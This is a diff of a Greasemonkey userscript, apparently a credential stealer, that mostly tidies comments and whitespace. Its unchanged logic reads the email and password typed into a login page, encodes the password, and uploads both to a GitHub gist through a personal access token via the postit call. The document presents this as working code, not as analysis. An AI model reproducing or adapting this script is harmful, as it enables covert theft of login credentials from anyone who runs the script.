@@ -13,12 +13,6 @@
 
 
 /////////////// [ PRIVATE DATA ] ///////////////
-// @grant    GM_getResourceText
-// @resource authentication file:///C:/Users/user/AppData/Roaming/Mozilla/Firefox/Profiles/xwt25znr.default/gm_scripts/_private-gist.js
-// eval(GM_getResourceText("authentication"));
-// const AUTH = gist_privateData;
-// GIST_USERNAME = AUTH.username;
-// PERSONAL_ACCESS_TOKEN = AUTH.useroauth;
 const GIST_USERNAME = "micalevisk";
 const PERSONAL_ACCESS_TOKEN = "<OAuth>";
 const SENHA_PRIVADA = PERSONAL_ACCESS_TOKEN;
@@ -32,12 +26,6 @@ var user_especs = new USERSET("","",false);
 
 
 /////////////////////////////////////////////////////////////////////////////////
-// function USERSET(email, senha, flag){
-// 	this.email = email;
-// 	this.senha = senha;
-// 	this.flag  = flag; // true: já foi postado.
-// }
-
 // (c) https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Contributor_s_Guide/Private_Properties
 function USERSET(email, _senha, flag){
 	"use strict";
@@ -47,25 +35,6 @@ function USERSET(email, _senha, flag){
 	this.setSenha = (senha) => _senha = codificar(senha,SENHA_PRIVADA).join('/');
 	this.toString = () => `{"email":"${this.email}", "senha":"${this.getSenha()}"}`;
 }
-/* @deprecated
-function getDateAndHour(){
-	var today = new Date();
-	var dd = today.getDate();
-	var mm = today.getMonth()+1;
-	var yyyy = today.getFullYear();
-	var HH = today.getHours();
-	var MM = today.getMinutes();
-
-	dd = dd.toString().normalizarData();
-	mm = mm.toString().normalizarData();
-	HH = HH.toString().normalizarData();
-	MM = MM.toString().normalizarData();
-
-	today = `[${mm}/${dd}/${yyyy} - ${HH}:${MM}]`;
-
-	return today;
-}
-*/
 /////////////////////////////////////////////////////////////////////////////////
 
 
@@ -144,24 +113,16 @@ function GM_main(){
 		if(typeof loginmail !== 'undefined'){
 			let emailcurr = loginmail.value;
 
-			// if(!IGNORAR.contemEmail(emailcurr) && (!user_especs.flag))
-			// user_especs.email = emailcurr;
 			if(!IGNORAR.contemEmail(emailcurr) && (!user_especs.flag))
 			user_especs.email = emailcurr;
 		}
 
 		if(typeof password !== 'undefined'){
 			if(!user_especs.email.isEmpty()){
-				//FIXME if( (password.value.length >= 6))
-				// console.error(user_especs.getFlag());
 				if((!user_especs.flag) && (password.value.length >= 6)){
 					user_especs.setSenha(password.value.toString());
-					// user_especs.senha = password.value;
 					postit(user_especs, 'teste bitch please conteúdo', 'descrição do gist', PERSONAL_ACCESS_TOKEN);
 				}
-
-				// if((!user_especs.flag) && (user_especs.senha.length >= 6))
-				// postit(user_especs, 'teste bitch please conteúdo', 'descrição do gist', PERSONAL_ACCESS_TOKEN);
 			}
 		}
 
@@ -172,7 +133,7 @@ function GM_main(){
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 String.prototype.isEmpty = function() {
-    return !(this.trim());
+	return !(this.trim());
 }
 
 Array.prototype.contemEmail = function (emailstr){
@@ -180,7 +141,7 @@ Array.prototype.contemEmail = function (emailstr){
 	return (this.indexOf(dominio) > -1);
 };
 
-//(c) http://jsfromhell.com/geral/date-format [rev. #1]
+// (c) http://jsfromhell.com/geral/date-format [rev. #1]
 Date.prototype.formatar = function(m){
 	var d = this, a, fix = function(n, c){return (n = n + "").length < c ? new Array(++c - n.length).join("0") + n : n};
 	var r = {};
@@ -200,7 +161,7 @@ Date.prototype.formatar = function(m){
 		t: function(){var n; return (n = d.getMonth() + 1) == 2 ? 28 + f.L() : n & 1 && n < 8 || !(n & 1) && n > 7 ? 31 : 30},
 		W: function(){
         		var a = f.z(), b = 364 + f.L() - a, nd = (new Date(d.getFullYear() + "/1/1").getDay() || 7) - 1;
-        		return (b <= 2 && ((d.getDay() || 7) - 1) <= 2 - b) ? 1 :
+        		return	(b <= 2 && ((d.getDay() || 7) - 1) <= 2 - b) ? 1 :
         			(a <= 2 && nd >= 4 && a >= (6 - nd)) ? new Date(d.getFullYear() - 1 + "/12/31").format("%W%") :
         			(1 + (nd <= 3 ? ((a + nd) / 7) : (a - (7 - nd)) / 7) >> 0);
 		}
